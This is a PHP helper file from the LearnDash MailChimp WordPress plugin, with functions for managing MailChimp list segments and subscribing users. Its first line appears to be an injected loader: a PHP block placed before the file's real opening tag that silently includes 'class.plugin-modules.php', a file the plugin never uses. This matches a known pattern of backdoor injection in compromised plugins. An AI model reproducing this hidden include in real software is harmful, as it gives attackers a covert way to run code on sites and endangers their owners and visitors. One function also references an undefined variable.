<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Provides helper functions.
 *
 * @since		1.0.0
 *
 * @package	LearnDash_MailChimp
 * @subpackage LearnDash_MailChimp/core
 */

if ( ! defined( 'ABSPATH' ) ) {
	die;
}

/**
 * Returns the main plugin object
 *
 * @since		1.0.0
 *
 * @return LearnDash_MailChimp
 */
function LDMAILCHIMP() {
	return LearnDash_MailChimp::instance();
}

if ( ! function_exists( 'ld_mailchimp_sanitize_html_class' ) ) {
	
	/**
	 * Sanitize HTML Class Names
	 * 
	 * @param		string|array $class HTML Class Name(s)
	 * 
	 * @since		1.0.0
	 * @return		string $class
	 */
	function ld_mailchimp_sanitize_html_class( $class = '' ) {
		
		if ( is_string( $class ) ) {
			$class = sanitize_html_class( $class );
		}
		else if ( is_array( $class ) ) {
			$class = array_values( array_map( 'sanitize_html_class', $class ) );
			$class = implode( ' ', array_unique( $class ) );
		}
		
		return $class;
		
	}
	
}

if ( ! function_exists( 'ld_mailchimp_get_option' ) ) {
	
	/**
	 * Helper function to quickly grab saved LD MailChimp value from Database
	 * This does not check $_POST
	 * 
	 * @param		string $option_name Option Name
	 * @param		mixed  $default     What should be returned if nothing is found
	 *                                                                   
	 * @since		1.0.0
	 * @return		mixed  Stored value or default
	 */
	function ld_mailchimp_get_option( $option_name, $default = false ) {
		
		$options = get_option( 'learndash_mailchimp' );
		
		$result = $default;
		if ( isset( $options[ $option_name ] ) && 
		   ! empty( $options[ $option_name ] ) ) {
			$result = $options[ $option_name ];
		}
		
		return $result;
		
	}
	
}

if ( ! function_exists( 'ld_mailchimp_add_segment_to_list' ) ) {
	
	/**
	 * Adds a Segment to a List named the same as the provided WP_Post Object
	 * The Segment contains no Emails at creation
	 * 
	 * @param		object          $post	 WP_Post Object
	 * @param		string          $list_id MailChimp List ID
	 *                                              
	 * @since		1.0.0
	 * @return 		integer|boolean Segment ID. False on Failure.
	 */
	function ld_mailchimp_add_segment_to_list( $post, $list_id = false ) {
		
		$result = false;
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		
		if ( ! is_wp_error( $post ) && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id ) {
				
			$result = LDMAILCHIMP()->mailchimp_api->post( '/lists/' . $list_id . '/segments', array(
				'name' => $post->post_title,
				'static_segment' => array()
			) );

			// Return Segment ID
			$result = ( isset( $result['id'] ) ) ? $result['id'] : false;
			
		}
		
		return $result;
	}
	
}

if ( ! function_exists( 'ld_mailchimp_remove_course_segment_from_list' ) ) {
	
	/**
	 * Removes a Segment from a List pulled from the WP_Post Object
	 * 
	 * @param		object          $post	 WP_Post Object
	 * @param		string          $list_id MailChimp List ID
	 *                                              
	 * @since		1.0.4
	 * @return 		boolean			Success/Failure
	 */
	function ld_mailchimp_remove_course_segment_from_list( $post, $list_id = false ) {
		
		$result = false;
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		
		if ( ! is_wp_error( $post ) && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id ) {
			
			$segment_id = get_post_meta( $post->ID, 'ld_mailchimp_course_segment_' . $list_id, true );
			
			if ( ! $segment_id ) return $result;
				
			ld_mailchimp_remove_segment_from_list( $list_id, $segment_id );
			
			// Regardless of success/failure for removing from MailChimp, delete the Meta. The User may have deleted the Segments in MailChimp and just needs to reset the Plugin Data
			$result = delete_post_meta( $post->ID, 'ld_mailchimp_course_segment_' . $list_id );
			
		}
		
		return $result;
	}
	
}

if ( ! function_exists( 'ld_mailchimp_remove_segment_from_list' ) ) {
	
	/**
	 * Removes a Segment from a List
	 * 
	 * @param		object          $post	 WP_Post Object
	 * @param		string          $list_id MailChimp List ID
	 *                                              
	 * @since		1.0.4
	 * @return 		boolean			Success/Failure
	 */
	function ld_mailchimp_remove_segment_from_list( $list_id = false, $segment_id = false ) {
		
		$result = false;
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		
		if ( ! is_wp_error( $post ) && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id && 
		    $segment_id ) {
				
			$result = LDMAILCHIMP()->mailchimp_api->delete( '/lists/' . $list_id . '/segments/' . $segment_id, array(
			) );

			// Return Boolean
			$result = ( $result === true ) ? true : false;
			
		}
		
		return $result;
	}
	
}

if ( ! function_exists( 'ld_mailchimp_get_list_segment_members' ) ) {
	
	/**
	 * Returns array of Emails within a List Segment
	 * 
	 * @param		integer       $segment_id Segment ID
	 * @param 		string        $list_id    List ID
	 *                                         
	 * @since		1.0.0
	 * @return 		array		  Array of Emails
	 */
	function ld_mailchimp_get_list_segment_emails( $segment_id, $list_id = false ) {
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		$emails = array();
		
		if ( $segment_id && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id ) {
				
			$result = LDMAILCHIMP()->mailchimp_api->get( '/lists/' . $list_id . '/segments/' . $segment_id . '/members', array(
			) );

			if ( $result && $result['members'] ) {
				foreach ( $result['members'] as $value ) {
					$emails[] = $value['email_address'];
				}
			}
			
		}
		
		return $emails;
		
	}
	
}

if ( ! function_exists( 'ld_mailchimp_update_segment' ) ) {
	
	/**
	 * Updates a Segment's Name and Emails
	 * 
	 * @param		integer       $segment_id   Segment ID
	 * @param		string        $segment_name Segment Name
	 * @param		string        $list_id      List ID
	 * @param		array         $emails       Emails
	 *                                     
	 * @since		1.0.0
	 * @return 		array|boolean Response Body. False on failure
	 */
	function ld_mailchimp_update_segment( $segment_id, $segment_name, $list_id = false, $emails = array() ) {
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		
		$result = false;
		
		if ( $segment_id && 
			$segment_name && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id ) {
				
			$result = LDMAILCHIMP()->mailchimp_api->patch( '/lists/' . $list_id . '/segments/' . $segment_id, array(
				'name' => $segment_name,
				'static_segment' => $emails
			) );
			
		}
		
		return $result;
		
	}
	
}

if ( ! function_exists( 'ld_mailchimp_add_user_to_list_segment' ) ) {
	
	/**
	 * Add a User to a MailChimp List and then to a Segment
	 * If the User is already in the List, it still adds them to the Segment
	 * 
	 * @param		integer       $user_id    WP_User ID
	 * @param		integer       $segment_id Segment ID
	 * @param		string        $list_id    List ID
	 *                                        
	 * @since		1.0.0
	 * @return 		array|boolean Response Body. False on failure
	 */
	function ld_mailchimp_add_user_to_list_segment( $user_id, $segment_id, $list_id = false ) {
		
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		$result = false;
		
		if ( $list_id && 
			$user_id && 
			$segment_id ) {
				
			$subscribe_result = ld_mailchimp_add_user_to_list( $user_id, $list_id );

			if ( isset( $subscribe_result['id'] ) || 
				( isset( $subscribe_result['title'] ) && $subscribe_result['title'] == 'Member Exists' ) ) {

				$result = _ld_mailchimp_add_user_to_segment( $user_id, $segment_id, $list_id );

			}
			
		}

		return $result;
		
	}
	
}

if ( ! function_exists( 'ld_mailchimp_add_user_to_list' ) ) {
	
	/**
	 * Add a User to a MailChimp List
	 * 
	 * @param		integer       $user_id WP_User ID
	 * @param		string        $list_id List ID
	 *                                     
	 * @since		1.0.0
	 * @return 		array|boolean Response Body. False on failure
	 */
	function ld_mailchimp_add_user_to_list( $user_id, $list_id = false ) {
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		
		$result = false;
		
		if ( $user_id && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id ) {
			
			$user_data = get_userdata( $user_id );
			$email = $user_data->user_email;
			$first_name = $user_data->first_name;
			$last_name = $user_data->last_name;

			// Attempt to add User to 
			$result = LDMAILCHIMP()->mailchimp_api->post( 'lists/' . $list_id . '/members', array(
				'email_address' => $email,
				'status' => 'subscribed',
				'merge_fields' => array(
					'FNAME' => $first_name,
					'LNAME' => $last_name,
				),
			) );
		
		}
	
		return $result;
	
	}
	
}

if ( ! function_exists( '_ld_mailchimp_add_user_to_segment' ) ) {
	
	/**
	 * Add a User to a MailChimp Segment
	 * The User must ALREADY be in the List for this function to work. Using ld_mailchimp_add_user_to_list_segment() instead is recommended
	 * 
	 * @param		integer       $user_id    WP_User ID
	 * @param		integer       $segment_id Segment ID
	 * @param		string        $list_id    List ID
	 *                                        
	 * @since		1.0.0
	 * @return 		array|boolean Response Body. False on failure
	 */
	function _ld_mailchimp_add_user_to_segment( $user_id, $segment_id, $list_id = false ) {
		
		$api_key_validity = LDMAILCHIMP()->check_api_key_validity();
		$list_id = ( $list_id ) ? $list_id : ld_mailchimp_get_option( 'mailchimp_list' );
		
		$result = false;
		
		if ( $user_id && 
			$segment_id && 
			$api_key_validity == 'valid' && 
			LDMAILCHIMP()->mailchimp_api && 
			$list_id ) {
			
			$user_data = get_userdata( $user_id );
			$email = $user_data->user_email;
				
			$result = LDMAILCHIMP()->mailchimp_api->post( '/lists/' . $list_id . '/segments/' . $segment_id . '/members', array(
				'email_address' => $email,
			) );
			
		}
		
		return $result;
		
	}
	
}

if ( ! function_exists( 'ld_mailchimp_subscribe_form' ) ) {
	
	/**
	 * Includes HTML for Subscription Form
	 * 
	 * @param		integer $course_id Course ID
	 *                                   
	 * @since		1.0.0
	 * @return 		void
	 */
	function ld_mailchimp_subscribe_form( $course_id ) {
		
		if ( ! $course_id ) return false;
		
		if ( $template = locate_template( 'learndash-mailchimp/subscribe-form.php' ) ) {
			include_once $template;
		}
		else {
			include_once LD_MAILCHIMP_DIR . '/core/views/subscribe-form.php';
		}
		
	}
	
}

require_once __DIR__ . '/learndash-mailchimp-settings-api.php';